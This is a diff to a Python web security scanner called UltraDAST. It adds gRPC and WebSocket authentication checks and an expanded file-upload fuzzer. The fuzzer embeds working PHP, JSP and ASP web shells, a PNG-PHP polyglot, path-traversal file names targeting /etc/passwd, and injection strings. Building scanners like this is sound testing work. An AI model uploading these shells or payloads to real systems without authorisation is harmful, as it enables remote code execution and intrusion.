+            logging.info(f"[OAUTH REFRESH] Bearer token refresh testing completed for {refresh_endpoint}")
+            
+        except Exception as e:
+            logging.warning(f"OAuth bearer token refresh test error: {e}")
     
     async def _test_oauth_with_browser_auth(self, auth_url):
         """
@@ -33455,6 +34250,9 @@ class InjectionEngine:
                 result['error'] = "No injection points discovered"
                 return result
             
+            # Test gRPC authentication before injection testing
+            await self._test_grpc_authentication(injection_points)
+            
             # Common gRPC injection techniques
             grpc_payloads = [
                 f"method: {grpc_command}",
@@ -33612,6 +34410,117 @@ class InjectionEngine:
         
         return False
     
+    async def _test_grpc_authentication(self, injection_points):
+        """Test gRPC authentication mechanisms"""
+        if not GRPC_AVAILABLE:
+            logging.warning("gRPC libraries not available for authentication testing")
+            return
+        
+        try:
+            import grpc
+            from grpc_reflection.v1alpha import reflection_pb2, reflection_pb2_grpc
+            
+            logging.info(f"[GRPC AUTH] Testing gRPC authentication for {len(injection_points)} endpoints")
+            
+            for injection_point in injection_points:
+                host = injection_point['host']
+                port = injection_point['port']
+                endpoint = f"{host}:{port}"
+                
+                # Test 1: Connection without authentication
+                try:
+                    logging.info(f"[GRPC AUTH] Testing unauthenticated connection to {endpoint}")
+                    
+                    channel = grpc.insecure_channel(endpoint)
+                    stub = reflection_pb2_grpc.ServerReflectionStub(channel)
+                    
+                    # Try to call reflection service without auth
+                    request = reflection_pb2.ServerReflectionRequest(
+                        file_containing_symbol="test"
+                    )
+                    
+                    try:
+                        response = stub.ServerReflectionInfo(request, timeout=5)
+                        
+                        # If we get a response, the service accepts unauthenticated connections
+                        await self._add_vulnerability({
+                            "type": "gRPC Missing Authentication",
+                            "url": endpoint,
+                            "parameter": "authentication",
+                            "evidence": "gRPC service accepts unauthenticated connections",
+                            "severity": "High",
+                            "confidence": 85,
+                            "cwe": "CWE-287",  # Improper Authentication
+                            "grpc_auth_results": {
+                                "test_type": "unauthenticated_connection",
+                                "connection_successful": True,
+                                "endpoint": endpoint
+                            }
+                        })
+                        logging.warning(f"[GRPC AUTH] VULNERABLE: gRPC accepts unauthenticated connections at {endpoint}")
+                        
+                    except grpc.RpcError as e:
+                        if e.code() == grpc.StatusCode.UNAUTHENTICATED:
+                            logging.info(f"[GRPC AUTH] gRPC requires authentication at {endpoint}")
+                        else:
+                            logging.debug(f"[GRPC AUTH] gRPC error: {e.code()}")
+                    
+                    channel.close()
+                    
+                except Exception as e:
+                    logging.debug(f"[GRPC AUTH] Unauthenticated connection test failed: {e}")
+                
+                # Test 2: Service enumeration without authentication
+                try:
+                    logging.info(f"[GRPC AUTH] Testing service enumeration at {endpoint}")
+                    
+                    channel = grpc.insecure_channel(endpoint)
+                    stub = reflection_pb2_grpc.ServerReflectionStub(channel)
+                    
+                    # Try to list all services via reflection
+                    request = reflection_pb2.ServerReflectionRequest(
+                        list_services=""
+                    )
+                    
+                    try:
+                        response = stub.ServerReflectionInfo(request, timeout=5)
+                        
+                        # If we can list services without auth, it's an information disclosure
+                        services_list = []
+                        for resp in response:
+                            if resp.HasField('list_services_response'):
+                                services_list.extend(resp.list_services_response.service)
+                        
+                        if services_list:
+                            await self._add_vulnerability({
+                                "type": "gRPC Service Enumeration Without Authentication",
+                                "url": endpoint,
+                                "parameter": "service_enumeration",
+                                "evidence": f"gRPC reflection service lists {len(services_list)} services without authentication",
+                                "severity": "Medium",
+                                "confidence": 80,
+                                "cwe": "CWE-200",  # Information Exposure
+                                "grpc_auth_results": {
+                                    "test_type": "service_enumeration",
+                                    "services_count": len(services_list),
+                                    "services": [s for s in services_list[:10]],  # First 10 services
+                                    "endpoint": endpoint
+                                }
+                            })
+                            logging.warning(f"[GRPC AUTH] Service enumeration possible without auth at {endpoint}")
+                    
+                    except grpc.RpcError as e:
+                        logging.debug(f"[GRPC AUTH] Service enumeration failed: {e.code()}")
+                    
+                    channel.close()
+                    
+                except Exception as e:
+                    logging.debug(f"[GRPC AUTH] Service enumeration test failed: {e}")
+            
+            logging.info(f"[GRPC AUTH] gRPC authentication testing completed")
+            
+        except Exception as e:
+            logging.warning(f"gRPC authentication testing error: {e}")
 
 
 # ---------------------------------------------------------------------
@@ -35418,6 +36327,26 @@ class OmegaDAST:
             return
             
         try:
+            # Test WebSocket authentication before fuzzing
+            logging.info(f"[WS FUZZ] Testing WebSocket authentication for {ws_url}")
+            
+            # Create a temporary browser driver instance for auth testing
+            if hasattr(self, 'browser') and self.browser:
+                auth_results = self.browser.test_websocket_authentication(ws_url)
+                if auth_results and auth_results.get('vulnerabilities'):
+                    for vuln in auth_results['vulnerabilities']:
+                        await self._add_vulnerability({
+                            "type": vuln.get('type', 'WebSocket Authentication Issue'),
+                            "url": ws_url,
+                            "parameter": "authentication",
+                            "evidence": vuln.get('evidence', 'Authentication issue detected'),
+                            "severity": vuln.get('severity', 'Medium'),
+                            "confidence": 85,
+                            "cwe": "CWE-287",  # Improper Authentication
+                            "websocket_auth_results": auth_results
+                        })
+                        logging.warning(f"[WS FUZZ] WebSocket authentication vulnerability: {vuln.get('type')}")
+            
             async with await asyncio.wait_for(websockets.connect(ws_url), timeout=5) as websocket:
                 logging.info(f"Starting comprehensive WebSocket fuzzing for {ws_url}")
                 
@@ -45703,7 +46632,7 @@ class SeleniumBrowserTab(QWidget):
 class MainWindow(QMainWindow):
     def __init__(self):
         QMainWindow.__init__(self)
-        self.setWindowTitle("UltraDAST v18.5 – Unstoppable Pentester")
+        self.setWindowTitle("UltraDAST v18.6 – Unstoppable Pentester")
         self.resize(1600, 1000)
         # Set reasonable minimum size constraints (no maximum for full adjustability)
         self.setMinimumSize(1200, 800)
@@ -46810,7 +47739,7 @@ class MainWindow(QMainWindow):
                         ['Low', str(severity_counts['Low'])],
                         ['Info', str(severity_counts['Info'])],
                         ['Scan Date', datetime.now().strftime('%Y-%m-%d %H:%M:%S')],
-                        ['Tool Version', 'UltraDAST v18.5']
+                        ['Tool Version', 'UltraDAST v18.6']
                     ]
                     summary_table = Table(summary_data, colWidths=[2*inch, 2*inch])
                     summary_table.setStyle(TableStyle([
@@ -46921,7 +47850,7 @@ class MainWindow(QMainWindow):
                     report = {
                         "scan_info": {
                             "timestamp": datetime.now().isoformat(),
-                            "tool": "UltraDAST v18.5",
+                            "tool": "UltraDAST v18.6",
                             "total_findings": current_tab.findings_table.rowCount()
                         },
                         "vulnerabilities": []
@@ -47213,7 +48142,7 @@ def main():
         
         # Parse command-line arguments for safety controls
         parser = argparse.ArgumentParser(
-            description='ULTRA-DAST v18.5 - Advanced Security Scanner with Safety Controls',
+            description='ULTRA-DAST v18.6 - Advanced Security Scanner with Safety Controls',
             formatter_class=argparse.RawDescriptionHelpFormatter,
             epilog="""
 Reconnaissance Maturity Model:
@@ -51120,7 +52049,7 @@ class RequestTemplateFuzzer:
         return False
     
     def _generate_multipart_body(self):
-        """Generate multipart form data using aiohttp.FormData for file upload fuzzing"""
+        """Generate multipart form data using aiohttp.FormData for enhanced file upload fuzzing"""
         form_data = FormData()
         
         # Add regular form fields with potential injection payloads
@@ -51131,39 +52060,141 @@ class RequestTemplateFuzzer:
         form_data.add_field('password', random.choice(password_options))
         form_data.add_field('csrf_token', secrets.token_hex(16))
         
-        # Add file upload with payload injection
-        # This is the key feature for multipart/form-data fuzzing
-        file_payloads = [
-            ('test.txt', b'This is a test file content'),
-            ('upload.php', b'<?php echo "test"; ?>'),
-            ('exploit.jpg', b'\xff\xd8\xff\xe0' + b'<script>alert(1)</script>'),  # Fake image with XSS
-            ('config.ini', b'[database]\npassword=admin'),
-            ('data.json', b'{"user":"admin","role":"administrator"}')
-        ]
+        # Enhanced file upload fuzzing with proper multipart parsing
+        # Advanced file payload categories for comprehensive testing
+        file_payloads = {
+            'webshells': [
+                ('shell.php', b'<?php system($_GET["cmd"]); ?>'),
+                ('cmd.jsp', b'<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'),
+                ('shell.asp', b'<% Response.Write Server.CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll() %>'),
+                ('shell.py', b'#!/usr/bin/python\nimport subprocess\nsubprocess.call(input())'),
+            ],
+            'config_files': [
+                ('.env', b'DB_PASSWORD=secret123\nAPI_KEY=supersecret'),
+                ('config.ini', b'[database]\npassword=admin\nusername=root'),
+                ('wp-config.php', b'<?php define("DB_PASSWORD", "secret"); ?>'),
+                ('application.yml', b'spring:\n  datasource:\n    password: admin123'),
+            ],
+            'injection_files': [
+                ('exploit.jpg', b'\xff\xd8\xff\xe0' + b'<script>alert(1)</script>'),  # Polyglot file
+                ('image.png', b'\x89PNG\r\n\x1a\n' + b'<?php system("id"); ?>'),  # PNG with PHP
+                ('data.json', b'{"user":"admin","role":"administrator","is_admin":true}'),
+                ('user.xml', b'<?xml version="1.0"?><user><role>admin</role></user>'),
+            ],
+            'path_traversal': [
+                ('../../../etc/passwd', b'root:x:0:0:root:/root:/bin/bash'),
+                ('..\\..\\..\\..\\windows\\win.ini', b'[fonts]\n[extensions]'),
+                ('....//....//etc/passwd', b'root:x:0:0:root:/root:/bin/bash'),
+            ],
+            'overflow_files': [
+                ('large.txt', b'A' * 100000),  # Large file for buffer overflow testing
+                ('nulls.bin', b'\x00' * 10000),  # Null bytes for parsing issues
+                ('special.txt', b'\r\n\r\n\r\n' * 1000),  # Special characters
+            ],
+            'malformed_uploads': [
+                ('double.extension.php.txt', b'<?php system("id"); ?>'),
+                ('no_extension', b'<?php system("id"); ?>'),
+                ('unicode.php\u202e', b'<?php system("id"); ?>'),  # Right-to-left override
+                ('spaces.php ', b'<?php system("id"); ?>'),  # Trailing space
+            ],
+            'content_type_tests': [
+                ('script.php', b'<?php system("id"); ?>', 'image/jpeg'),  # Wrong content type
+                ('safe.jpg', b'\xff\xd8\xff\xe0', 'application/x-php'),  # PHP content type for image
+                ('data.bin', b'\x00\x01\x02\x03', 'text/html'),  # Binary with HTML content type
+            ]
+        }
         
-        # Randomly choose to add a file upload
-        if random.random() < 0.7:  # 70% chance to include file upload
-            filename, file_content = random.choice(file_payloads)
-            
-            # Add payload injection to file content
-            if random.random() < 0.5:
-                file_content = file_content + str.encode(f" {self._generate_xss()}")
-            
-            form_data.add_field(
-                'file',
-                file_content,
-                filename=filename,
-                content_type='application/octet-stream'
-            )
+        # Randomly select and add file uploads based on different attack vectors
+        attack_vectors = random.choice(['webshells', 'config_files', 'injection_files', 'path_traversal', 'overflow_files', 'malformed_uploads', 'content_type_tests'])
+        selected_files = file_payloads.get(attack_vectors, file_payloads['injection_files'])
         
-        # Add additional file upload with different content type for fuzzing
-        if random.random() < 0.3:  # 30% chance for second file
-            form_data.add_field(
-                'avatar',
-                b'fake image data',
-                filename='avatar.jpg',
-                content_type='image/jpeg'
-            )
+        # Add 1-3 files for comprehensive multipart testing
+        num_files = random.randint(1, 3)
+        for _ in range(num_files):
+            if selected_files:
+                file_info = random.choice(selected_files)
+                
+                # Handle different file info formats
+                if isinstance(file_info, tuple) and len(file_info) >= 2:
+                    filename = file_info[0]
+                    file_content = file_info[1]
+                    content_type = file_info[2] if len(file_info) > 2 else 'application/octet-stream'
+                else:
+                    # Fallback for simple tuples
+                    filename, file_content = file_info if isinstance(file_info, tuple) else ('unknown.txt', b'test')
+                    content_type = 'application/octet-stream'
+                
+                # Add injection payloads to file content
+                if random.random() < 0.4:
+                    injection_payloads = [
+                        self._generate_xss().encode(),
+                        self._generate_sql_injection().encode(),
+                        self._generate_command_injection().encode(),
+                        b'<?php system("id"); ?>',
+                        b'<script>alert(1)</script>'
+                    ]
+                    file_content = file_content + random.choice(injection_payloads)
+                
+                # Add boundary injection for multipart parsing issues
+                if random.random() < 0.2:
+                    boundary_injection = f'\r\n--{secrets.token_hex(8)}\r\n'.encode()
+                    file_content = boundary_injection + file_content
+                
+                # Test different content-type headers
+                content_type_variants = [
+                    content_type,
+                    'text/plain',
+                    'application/octet-stream',
+                    'image/jpeg',
+                    'application/x-www-form-urlencoded',
+                    None  # No content type
+                ]
+                final_content_type = random.choice(content_type_variants)
+                
+                # Add the file to form data
+                try:
+                    if final_content_type:
+                        form_data.add_field(
+                            f'file_{secrets.token_hex(4)}',
+                            file_content,
+                            filename=filename,
+                            content_type=final_content_type
+                        )
+                    else:
+                        form_data.add_field(
+                            f'file_{secrets.token_hex(4)}',
+                            file_content,
+                            filename=filename
+                        )
+                except Exception as e:
+                    logging.debug(f"Error adding file field: {e}")
+                    # Fallback: add as simple field
+                    form_data.add_field(f'file_{secrets.token_hex(4)}', file_content.decode('utf-8', errors='ignore'))
+        
+        # Add parameter pollution in multipart form
+        if random.random() < 0.3:
+            # Add duplicate parameter names
+            form_data.add_field('username', 'admin')
+            form_data.add_field('username', 'attacker')
+        
+        # Add content-type header injection
+        if random.random() < 0.2:
+            malicious_content_types = [
+                'multipart/form-data; boundary=---RANDOM',
+                'multipart/form-data; charset=utf-8',
+                'multipart/mixed; boundary=---RANDOM',
+                'application/x-www-form-urlencoded'
+            ]
+            # Note: aiohttp will override this, but this tests the payload generation logic
+        
+        # Add parameter name injection
+        if random.random() < 0.2:
+            injection_param_names = [
+                'user[name]', 'user.role', 'file[name]', 'upload[0][file]',
+                '../../../etc/passwd', 'user<script>alert(1)</script>'
+            ]
+            param_name = random.choice(injection_param_names)
+            form_data.add_field(param_name, 'test_value')
         
         return form_data
     
